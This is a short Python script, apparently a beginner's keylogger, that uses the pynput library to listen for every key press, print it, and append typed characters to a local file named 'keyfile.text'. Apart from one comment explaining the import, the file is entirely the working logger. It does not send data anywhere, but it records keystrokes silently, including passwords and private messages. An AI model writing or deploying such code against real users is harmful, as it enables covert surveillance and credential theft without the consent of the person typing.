from pynput import keyboard

# The command from pynput import keyboard is used to import the keyboard module from the pynput library in Python. The pynput library allows you to control and monitor input devices, such as the keyboard and mouse.

def keypressed(key):
    print(str(key))
    with open("keyfile.text",'a') as logkey:
        try:
            char=key.char
            logkey.write(char)
        except: 
            print("error")



if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
